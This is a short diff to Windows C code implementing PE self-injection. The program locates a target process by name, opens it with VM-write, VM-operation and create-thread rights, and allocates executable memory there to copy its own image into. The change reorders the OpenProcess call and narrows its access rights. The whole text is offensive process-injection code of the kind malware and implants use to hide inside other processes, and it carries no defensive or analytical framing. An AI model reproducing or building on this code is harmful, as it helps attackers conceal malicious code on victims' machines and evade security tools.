@@ -33,6 +33,9 @@ uint32_t get_pid_by_name(const char* ProcessName) {
 }
 
 bool self_inject(uint32_t process_id, LPTHREAD_START_ROUTINE entry_point, void* parameter) {
+    // Open the target process - this is process we will be injecting this PE into
+    HANDLE targetProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION, FALSE, process_id);
+
     // Get current image's base address
     PVOID imageBase = GetModuleHandle(NULL);
     PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
@@ -41,9 +44,6 @@ bool self_inject(uint32_t process_id, LPTHREAD_START_ROUTINE entry_point, void* 
     // Allocate a new memory block and copy the current PE image to this new memory block
     PVOID localImage = VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
     memcpy(localImage, imageBase, ntHeader->OptionalHeader.SizeOfImage);
-
-    // Open the target process - this is process we will be injecting this PE into
-    HANDLE targetProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, process_id);
 
     // Allote a new memory block in the target process. This is where we will be injecting this PE
     PVOID targetImage = VirtualAllocEx(targetProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
